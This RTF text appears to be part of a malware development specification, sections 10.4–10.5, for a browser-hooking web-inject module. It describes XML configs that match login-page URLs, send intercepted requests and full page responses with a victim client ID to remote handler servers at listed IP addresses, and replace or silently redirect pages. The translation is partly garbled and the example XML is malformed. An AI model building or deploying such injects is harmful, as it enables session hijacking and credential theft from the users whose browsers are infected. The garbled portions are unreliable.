{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}{\f1\fnil\fcharset0 Courier New;}{\f2\fnil\fcharset0 Lucida Console;}}
{\colortbl ;\red255\green0\blue0;\red0\green0\blue255;}
{\*\generator Riched20 10.0.22000}\viewkind4\uc1 
\pard\sa200\sl276\slmult1\highlight0\b\f0\fs22\lang9 10.4 \b0 Dynamic injections configuration is an ANSI-encoded XML text file which contains rules for handling HTTP responses from servers. The config describes the list of http(s)-link masks which should be processed, handler address and additional flags. \par
The configuration is organized as an array of elements in <igroup> tags.  Each <igroup> contains an unlimited number of elements in the <dinj> tags.  Each <dinj> element describes the rule of HTTP-response processing, it contains the reference mask, the address of the handler and additional flags: whether to send the sought http-request and priority. The link mask is located in tag <lm> in the attribute "value", the address of the handler in tag <hl>, whether to send http-request in tags <sq> and priority <pri>. \par
The parameter in the <sq> tag contains a non-negative numeric value. If it is equal to zero then you should not send HTTP request to HTTP request handler, if it is equal to one then the request header only should be sent to handler, if it is equal to 2 then the whole request should be sent to handler. Parameter in <sq> tag can be absent at all, in this case it is equal to zero.\par
The priority in the <pri> tag contains a non-negative numeric value. If the priority is not specified, its value is equal to the maximum positive 32-bit value (signed int) - 2 147 483 647. A priority value of zero is allowed.\par
The handler address is the http link of the handler on the remote server. The link is always prefixed with http:// or https://.  If the prefix is https:// you must use HTTPS to communicate with the handler.\par
A reference mask is some expression that contains an asterisk, a question mark and square brackets "[]". The asterisk stands for any sequence of characters, including the empty one. A question mark indicates any single character. Square brackets list single characters, for example [jeu] - it can only be replaced by one of the three characters "j", "e" or "u". , "e" or "u", [?] - only question mark character, [[] - only opening square bracket, [*] - only asterisk character, [[*] - asterisk or opening square bracket.\par
Example: q[\f1 abc]erty[?]u[]uu??88]88*\par
qaerty?u[uuzz88]88444 \f0 - fits\par
\f1 qbertysu[uuzz88]88444 \f0 - does not fit\par
\f1 qcerty?u[uuz88]88 \f0 - does not fit\cf1\par
\cf0\f1 qaerty?u[uuz?88]88 \f0 - fit\par
\f1 qrerty?u[uuz?88]88 \f0 does not fit\par
\f1 qaerty?u!uuz?88]8811 \f0 does not fit\par
The link mask never includes the http(s):// prefix and the link you are looking for is checked without this prefix.\par
An example of a dynamic injector config:\par

\pard\sa200\sl240\slmult1\f2\fs20 <igroup>.\par
<dinj> \par
<lm value="*/logon/*"/>\par
<hl> {\cf2\ul{\field{\*\fldinst{HYPERLINK "http://14.25.36.47/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{http://14.25.36.47/test2.php}}}}{\cf2\ul\f2\fs20{\field{\*\fldinst{HYPERLINK "http://14.25.36.47/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{<}}}}{\f2\fs20{\field{\*\fldinst{HYPERLINK "http://14.25.36.47/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{/hl}}}}{\f2\fs20{\field{\*\fldinst{HYPERLINK "http://14.25.36.47/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{>}}}}{\f2\fs20{\field{\*\fldinst{HYPERLINK "http://14.25.36.47/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{<}}}}{\f2\fs20{\field{\*\fldinst{HYPERLINK "http://14.25.36.47/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{ }}}}{\f2\fs20{\field{\*\fldinst{HYPERLINK "http://14.25.36.47/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{/dinj }}}}\cf0\ulnone\f2\fs20\par
</igroup>.\par
<igroup>.\par
<dinj> <lm>*test*.com/qwerty[?]*</lm>\par
<hl> {\cf2\ul{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{https://1.2.3.4/test2.php}}}}{\cf2\ul\f2\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{<}}}}{\f2\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{/hl}}}}{\f2\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{>}}}}{\f2\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{<}}}}{\f2\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{ }}}}{\f2\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{/dinj}}}}\cf0\ulnone\f2\fs20\par
<dinj> \par
<lm value="?? site.net/cderfv.asp*">\par
\par
<lm>.\par
<hl> {\cf2\ul{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl"}}{\fldrslt{https://1.2.3.4/test2.php}}}}{\cf2\ul\f2\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl"}}{\fldrslt{<}}}}{\f2\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl"}}{\fldrslt{/hl}}}}{\f2\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl"}}{\fldrslt{>}}}}\cf0\ulnone\f2\fs20\par
<pri>1</pri>\par
<sq>1</sq>\par
< /dinj>.\par
<dinj> \par
<lm>[abcdef]wert[1234567890].com/papka/userprofile.php</lm>\par
<hl> {\cf2\ul{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test.php%3C/hl"}}{\fldrslt{https://1.2.3.4/test.php}}}}{\cf2\ul\f2\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test.php%3C/hl"}}{\fldrslt{<}}}}{\f2\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test.php%3C/hl"}}{\fldrslt{/hl}}}}{\f2\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test.php%3C/hl"}}{\fldrslt{>}}}}\cf0\ulnone\f2\fs20\par
<pri>10</pri>.\par
< /dinj>.\par
</igroup>.\par
<igroup><dinj \par
<lm>*/sitelogin/*</lm>\par
<hl> {\cf2\ul{\field{\*\fldinst{HYPERLINK "http://41.24.53.64:8089/test.aspx%3C/hl"}}{\fldrslt{http://41.24.53.64:8089/test.aspx}}}}{\cf2\ul\f2\fs20{\field{\*\fldinst{HYPERLINK "http://41.24.53.64:8089/test.aspx%3C/hl"}}{\fldrslt{<}}}}{\f2\fs20{\field{\*\fldinst{HYPERLINK "http://41.24.53.64:8089/test.aspx%3C/hl"}}{\fldrslt{/hl}}}}{\f2\fs20{\field{\*\fldinst{HYPERLINK "http://41.24.53.64:8089/test.aspx%3C/hl"}}{\fldrslt{>}}}}\cf0\ulnone\f2\fs20\par
<pri>45</pri><sq>2</sq>\par
<dinj> </igroup>\f0\par

\pard\sa200\sl276\slmult1\fs22 In this example, one igroup has three dinjs, the other two have one dinj each.\par
Additional tags may be specified inside the lm tag, indicating additional conditions for using the link or ignoring it.\par
ignore_mask - ignore if the link matches the mask specified in the value attribute. If multiple ignore_mask tags are specified, the link will be ignored if it matches at least one of those tags.\par
ignore_header - ignore if the response contains a header that matches the header and value attributes. If more than one ignore_header tag is specified, the link will be ignored if it matches at least one of those tags. Values in header and value attributes can be specified as masks.\par
require_header - additional check on the header, if the response contains a header that matches the header and value attributes, it will be sent for processing. If several require_header tags are specified, the link will be accepted only if it \b matches all of \b0 them. Values in header and value attributes can be specified as masks.\par
<dinj> \par
  <lm value="example.com/*">\par
    <ignore_mask value ="*.css"/>\par
    <ignore_mask value ="*.rar"/>\par
    <ignore_header header="content-type" value="text/plain"/>\par
   <require_header header="content-lang" value="*"/>\par
  </lm>.\par
  <hl value="test.net/handler.php">\par
</dinj>. \par
In the specified config snippet, the link example.com/assetst/test.css will be ignored, and the link example.com/assetst/test.html will be processed only if the server response contains a content-lang chider.\par
\b 10.4.1 \b0 Processing of HTTP-response starts only after receiving its content from server (in AfterReceiveResponse collab in browser interceptor code). If a request link in reply matches multiple <dinj> elements \ul in different \ulnone <igroups> (at least one in a separate <igroup>), then the link should be skipped without any processing. \par
After it has been fully received, a POST request should be sent to the Handler address. If there are multiple <dinj> elements with a mask that satisfy the given link and they \ul all belong to the same \ulnone <group>, they should be queried one by one in ascending order of priority (the lowest-priority handler goes first). If there are more than one handler with the same priority, this situation should be resolved at the developer's discretion. It is understood that the config builder must take care that such situations do not arise.\par
The body of the POST request is in nultipart/form-data format. It must contain the following elements:\par
\i sourcelink \i0 - the full search link with the prefix https:// or http:// (if there is no way to find out which protocol, then always put https://) in ANSI encoding.\par
\i sourcequery \i0 - the http request being searched for, depends on the value in the sq parameter in <dinj>. The parameter may not exist if the value in the sq parameter is zero.\cf1\par
\cf0\i sourcehtml \i0 - the http response you are looking for. Full server response from beginning to end with all hitters, \ul unchanged\ulnone , in the encoding you are looking for.\par
Besides the parameters in the body, the following parameters must be specified in the request URI in the format urlencode:\line cid - clientid identifier, clientid as a string (see point 2.1.2).\par
group - customer group tag as a string.\cf1\par
\cf0 Handler response:\par
\i 200\i0  - handler changed the page and the response body contains the new changed server response with all the handlers, which should be substituted for the browser. No other handlers should be called.\par
\i 303\i0  - handler has not changed the page and still allows other handlers to be accessed, if any.\par
\i 304\i0  - Handler did not change the page and prohibits access to other handlers \par
All other codes must be treated as response 303, after which the given <dinj> element (or some object or structure in memory which describes the given <dinj> element) must be deactivated for 30 minutes and not participate in processing in any way. The deactivation must be local only to the current process.\par
\b 10.5 \b0 The static injections configuration is an ANSI-encoded XML text file which contains rules for handling HTTP responses from servers. The config describes a list of redirects. \par
Unlike dynamic injections, static injections are at a lower level and block http requests to the original server and completely replace the http responses (if any) of the original server.\par
The config describes a list of static injectors. The list of static injectors is specified in the <slist> tag. The <slist> tag contains a list of elements in the <sinj> tags. Each element sinj contains: a triggered mask in the tag <mm> , a link to trigger the injection <sm> , the name of the handler <srv> , the new value of the host field in the <nh> query headers.  The sm tag is optional, in this case it is assumed to be equal to the content of the mm tag.\par
Each static injector can be in three states: "ready", "on" and "off". Initially, it is in the "ready" state and stays in this state until the link specified in the sm tag is clicked. As soon as the link is clicked, the static injector switches to the "on" state.  An inject can move to the "on" state only from the "ready" state. Inject can go to the "ready" state only from the "off" state\par
It is implied that the decision to switch the injector from the "ready" state to the "on" state is made in the CheckURL colbeck. The decision about switching the injector from "on" to "off" state is made in the AfterReceiveResponse colbeck. \par
Triggering mask (tag mm) - mask identical to the one in the configuration of dynamic injections. All requests matching this mask should be sent to the server handler\par
Reference mask on which the injector will be triggered or just an inclusion mask (sm tag or mm tag) - the mask of the link when the injector goes from the "ready" to the "triggered" state\cf1\par
\cf0 Server handler (srv tag) - ip:port value pair which points to the handler server. If the port value is even, it works without encryption (HTTP), if the port is odd, it works over SSL/TLS (HTTPS).\cf1\par
\cf0 New host value (nh tag) - the host field value to replace the original host field value in the outgoing request header.\par
An example of a config:\par
\f1 <slist>. \par
<sinj>\par
<mm>site.com/*</mm>\par
<sm>site.com/loginpage</sm>\par
<nh>othersite.com</nh>\par
<srv>11.22.33.44:80</srv>\par
</sinj>. \par
<sinj> \par
<mm>qwerty1.net/papka2/*</mm>\par
<nh>zxc.org</nh>\par
<srv>1.2.3.4:443</srv>\par
</sinj>.  \par
<slist>. \f0\par
\par
\b 10.5\b0 As the simplest analogy to static injections we should consider redirecting some pages. So, let's say we are in the BeforeSendRequest column and after checking the link from all the injectors which are in the "on" state, it becomes clear that the link fits some injector, then we need to redirect the request to the server handler. \par
To redirect it, you need to copy the outgoing request, change the host field in the copy to the one specified in the config tag "nh", add "X-Forwarded-for" header with its own external ip-address, and "clientinfo" header which will contain first the client group tag and then with a space its full clientid, oh. After these modifications, you have to send the request to the handler server. If the server port is even, then via SSL/TLS. It is recommended to send the request asynchronously or just in a separate thread. \par
The original request to the original server must be modified so that it becomes a GET request with a URI of "/", remove the header with cookies and other specific tags, then send to the original server.\par
After receiving the response from the original server, in the AfterReceiveResponse column, you must wait for the response from the server-handler to arrive. After that replace the original server's response (header and body) with the response from the server-handler.\par
Among other things, the handler server response can contain one special tag named "sinjdsto", which contains a numeric value. The presence of this chider in the handler server response means that the static inject should be switched from the "on" to the "off" state. The numeric value indicates the number of seconds after which the static injector will automatically switch from the "off" to the "ready" state. When replacing the response of the original server with the response of the handler server, the "sinjdsto" header must be removed. \par
The implication is that all trigger masks (and therefore trigger masks) do not overlap each other in the static injector config. The implication is that the link in the CheckURL column will only trigger on one trigger mask, and the link in the BeforeSendRequest column will only trigger on one trigger mask. Otherwise, it is up to the developer to resolve the situation. It is understood that the author of the config will take care of the uniqueness of the masks in the "sinj" tags.\par
If the AfterReceiveResponse collab knows that the request was handled by a static injection, it should not be handled by a dynamic injection. Thus, static injections have priority over dynamic injections.\cf1\par
\cf0\par
}
 